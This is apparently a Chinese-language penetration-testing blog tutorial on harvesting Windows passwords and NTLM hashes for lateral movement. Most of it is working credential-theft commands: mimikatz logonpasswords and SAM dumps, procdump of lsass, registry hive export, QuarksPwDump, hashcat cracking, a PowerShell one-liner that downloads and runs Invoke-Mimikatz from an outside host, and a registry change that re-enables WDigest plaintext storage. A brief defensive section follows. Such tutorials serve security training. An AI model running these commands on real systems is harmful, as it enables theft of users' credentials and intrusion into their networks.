![](https://image.3001.net/images/20200805/1596616536.jpg!small)

## 横向移动

在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。

在内网渗透中，很多横向移动的方法都需要攻击者先获取域用户的密码或者Hash值才能进行，比如哈希传递攻击、各种票据传递，还有黄金票据维持权限等等。在这篇文章中，我们先来讲解一下横向移动中获取域内单机密码的方法，下篇文章再来讲那几种攻击手段。由于近期一直在准备“蓝帽杯”得比赛，所以一直没有时间更新，文章可能略显仓促，不足之处还请多多指教。

本文专为想我一样正在入门的小白准备，大佬请路过！

## Windows中的密码

在Windows2000以后，Windows机器都用NTLM算法在本地保存用户的密码，密码的NTLM哈希保存在%SystemRoot%\System32\config\SAM文件中。
Windows操作系统通常使用两种方法对用户的密码进行哈希处理，即 LAN Manager（LM）哈希和 NT LAN
Manager（NTLM）哈希。所谓哈希（Hash），即使用一种加密方法对明文密码进行加密，对一个任意长度的字符串数据进行一次加密运算，都可以返回一个固定长度的字符串。Windows加密过的密码口令，我们称之为Hash。

Windows操作系统中的密码一般由两部分组成：一部分为LM Hash，另一部分为NTLM Hash。在Windows中，Hash的结构通常如下：

    
    
     **Username:RID:LM-Hash:NT-Hash**

在windows2000以后的系统中，第一部分的 LM-hash 都是空值，因为LM-hash可以很容易的破解，所以windows2000之后这个值默认为空，所以第二部分的NTLM-hash才真正是用户密码的哈希值。

在渗透测试中，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件（在域环境中，用户信息存储在NTDS.dit中）中获得所有用户的Hash。也可以通过Mimikatz读取lsass.exe进程获得已登录用户的NTLM
hash和明文值 。

详情请见：<https://blog.csdn.net/qq_36119192/article/details/85941222>

## 获取明文密码或密码Hash

获取到Hash后，我们可以用破解工具来破解得到明文密码，也可以进行哈希传递攻击（PTH）来横向渗透。

### PwDump7工具

下载地址：<https://www.openwall.com/passwords/windows-pwdump>

Pwdump7可以在CMD下提取出系统中的用户的密码hash
(包括LM和NTLM)，需要系统权限，“骨灰”级黑客玩家可能听说过这个玩具。通过Pwdump7提取出的HASH，可以用ophcrack等工具破出明文密码，对进一步渗透是有很大帮助的。

工具使用很简单，只需在命令行环境中运行Pwdump7程序，即可得到当前系统中各个用户的密码Hash (包括LM和NTLM)：

### ![](https://image.3001.net/images/20200805/1596619267.png!small)

### Mimikatz工具

下载地址：<https://github.com/gentilkiwi/mimikatz>

Mimikatz是由法国人Benjamin开发的一款功能强大的轻量级调试工具，因功能强大，能够直接读取Windows操作系统的明文密码，因而闻名于渗透测试领域。通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从
lsass.exe 进程中获取 **当前登录系统用户名的密码** ，
lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其
wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz
正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！

 **注：** 但是在安装了KB2871997补丁或者系统版本大于win10或windows server
2012时，默认在内存缓存中禁止保存明文密码，这样利用mimikatz就不能从内存中读出明文密码了，但可以通过修改注册表的方式抓取明文。

Mimikatz读取明文密码和hash也时最常用的方法。需要管理员权限。

    
    
    privilege::debug      // 提升至debug权限
    sekurlsa::logonpasswords       // 抓取密码

![](https://image.3001.net/images/20200805/1596620269.png!small)

Procdump是微软官方发布的工具，所以杀软不会拦截，其可以用来将目标lsass文件导出。下载地址：<https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump>

先用在目标机器上传微软的工具Procdump，导出其lsass.exe：

    
    
    procdump64.exe -accepteula -ma lsass.exe lsass.dmp

![](https://image.3001.net/images/20200805/1596625310.png!small)将在目标机器上导出的lsass.dmp下载到本地后，执行mimikatz导出lsass.dmp里面的密码和hash：

    
    
    sekurlsa::minidump 目录\lsass.dmp       // 将导出的lsass.dmp载入到mimikatz中
    sekurlsa::logonpasswords full                 // 获取密码

### ![](https://image.3001.net/images/20200805/1596625777.png!small)

### 通过SAM和System文件抓取密码和Hash

先利用注册表命令将目标机的sam或system文件导出，需要管理员权限：

    
    
    reg save hklm\sam sam.hive
    reg save hklm\system system.hive

![](https://image.3001.net/images/20200805/1596626140.png!small)然后，将目标机上的sam.hive和system.hive下载到本地，利用mimikatz读取sam和system文件获取NTLM
Hash：

    
    
    lsadump::sam /sam:sam.hive /system:system.hive

![](https://image.3001.net/images/20200805/1596626444.png!small)
**也可以直接使用mimikatz读取本地SAM文件，获得密码Hash：**

    
    
    privilege::debug
    token::elevate
    lsadump::sam

![](https://image.3001.net/images/20200805/1596626650.png!small)

### Quarks PwDump工具

下载地址：<https://github.com/quarkslab/quarkspwdump>

Quarks PwDump
是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。目前支持Windows
XP/2003/Vista/7/8版本，相当稳定。

使用需要管理员权限：

    
    
    QuarksPwDump.exe --dump-hash-local        // 导出本地hash值  
    QuarksPwDump.exe -dhl

![](https://image.3001.net/images/20200805/1596627062.png!small)

    
    
    QuarksPwDump.exe -dhdc         // 导出内存中的域控哈希值  
    QuarksPwDump.exe --dump-hash-domain-cached

![](https://image.3001.net/images/20200805/1596627310.png!small)

### 使用Powershell脚本

使用powershell脚本加载mimikatz模块获取密码，该脚本位于powersploit后渗透框架中，下载地址：<https://github.com/PowerShellMafia/PowerSploit>

通过在目标机上远程下载执行该powershell脚本即可获取密码，需要管理员权限。

    
    
    powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/powersploit/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

![](https://image.3001.net/images/20200805/1596627962.png!small)

    
    
    powershell -exec bypass -c "& {Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -DumpCreds}"

## Windows密码哈希破解方法

### ophcrack在线破解

获取到密码hash后，我们要对其进行破解，以得到明文密码。如今网上有很多的网站提供在线密码破解服务，在获取密码哈希后，可以对其进行在线破解。

网址：<https://www.objectif-securite.ch/en/ophcrack>

![](https://image.3001.net/images/20200805/1596628474.png!small)将得到的NTLM
Hash输入到第一个查询框内，点击GO即可进行破解，小于14位的密码一般在几分钟内就可以破解完成：

### ![](https://image.3001.net/images/20200805/1596628680.png!small)

### ophcrack工具

ophcrack是一款Windows密码哈希值破解工具，其官方给我们提供了几十GB的哈希表。

ophcrack下载地址：<https://ophcrack.sourceforge.io/>

ophcrack提供的彩虹表下载地址：<https://ophcrack.sourceforge.io/tables.php>

ophcrack使用十分简单，打开程序，点击Load导入哈希值，然后通过加载Tables后，执行Crack即可进行破解：

![](https://image.3001.net/images/20200805/1596629679.png!small)

ophcrack详情见：<https://blog.csdn.net/m0_37438418/article/details/80157535>

### Hashcat工具

Hashcat号称是世界上最快的密码破解工具，世界上第一个和唯一一个基于GPGPU规则的引擎。

Windows版下载地址：<https://hashcat.net/hashcat/>

linux版下载地址：<https://github.com/hashcat/hashcat>

下载下来之后，进入其源码的目录执行“make && make install”命令即可编译安装。

执行“hashcat -h”进入帮助页面：

![](https://image.3001.net/images/20200805/1596634631.png!small)

（1）-m 指定哈希值类型

比如我们常用的有

  * -m 1000：NTLM
  * -m 5600：Net-NTLMv2
  * -m 5500：NetNTLMv1 / NetNTLMv1+ESS
  * -m 0：MD5
  * -m 2500：WPA/PSK

更多哈希类型请见官网：<https://hashcat.net/wiki/doku.php?id=example_hashes>

（2）-a 指定破解模式

  * -a 0：字典模式
  * -a 1：组合模式
  * -a 3：掩码暴力破解

rules目录下存放着生成字典的各种规则，我们在当前目录下将基础信息保存在 base.txt文件中

将准备好的字典passwords.txt和需要破解的哈希值文件hash.txt放置到hashcat所在目录下

    
    
    ./hashcat -m xx -a 0 <hashfile> <passwords.list1> <passwords.list2>  
    ./hashcat -m 1000 -a 0 hash.txt -o result.txt passwords.txt  
    ./hashcat -m 1000 -a 0 NTLM Hash passwords.txt

-a 0：指定以字典模式破解。

-m xx：指定hashfile文件里的哈希值类型。

-o：把破解到的结果写入文件

<hashfile>：将多个哈希值存入文件，等待破解。

<passwords.list>：指定字典文件。

![](https://image.3001.net/images/20200805/1596634930.png!small)Hashcat的功能十分强大，能干的时很多，你们自己去慢慢探索，愉快的折腾吧！

## 相关防范措施

微软为了防止用户的明文密码在内存中泄露，发布了KB2871997补丁，关闭了Wdigest功能。Windows
Server2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows
Server2012以下版本，如果安装了KB2871997补丁，攻击者同样无法获取明文密码。

在命令行环境开启或关闭Wdigest Auth，有如下两种方法：

使用 red add命令

    
    
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f           // 开启Wdigest Auth
     
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f           // 关闭Wdigest Auth

 **攻击方法：** 需要将UseLogonCredential的值设为1，然后注销当前用户，用户再次登录后使用mimikatz即可导出明文口令。

> Nishang中的Invoke-MimikatzWDigestDowngrade脚本集成了这个功能，地址如下：
>
> <https://github.com/samratashok/nishang/blob/master/Gather/Invoke-> MimikatzWDigestDowngrade.ps1>

## Ending......

本节，我们介绍了在内网渗透中获取域内单机密码和Hash的方法，获取到Hash后，我们可以使用工具进行爆破，获得明文密码，也可以用来哈希传递、票据传递等方法来对内网进行横向渗透，对内网渗透还是很有用的。

在下节中，我们将具体详细的讲解PTH、PTT等内网横向移动手法。

> 参考：
>
> <https://www.cnblogs.com/-mo-/p/11890232.html>
>
> <https://blog.csdn.net/m0_37438418/article/details/80157535>
>
> <https://blog.csdn.net/tonghua6/article/details/45154317>
>
> <https://yq.aliyun.com/articles/496300>
>
> 《Sqlmap从入门到精通》

![](https://image.3001.net/images/20200806/1596681322.jpg!small)由于近期一直在准备“蓝帽杯”得比赛，所以一直没有时间更新，文章可能略显仓促，不足之处还请多多指教。

个人博客：<https://whoamianony.top/>

